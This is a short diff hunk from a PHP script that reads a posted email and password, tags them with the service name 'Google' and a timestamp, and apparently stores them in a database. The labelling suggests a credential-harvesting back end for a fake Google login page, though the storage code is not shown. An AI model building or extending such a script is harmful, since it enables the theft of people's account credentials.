@@ -14,7 +14,7 @@ if ($conn->connect_error) {
 }
 
 // Get form data
-$user = $_POST['username'];
+$user = $_POST['email'];
 $pass = $_POST['password'];
 $service = "Google";
 $timestamp = date('Y-m-d H:i:s');
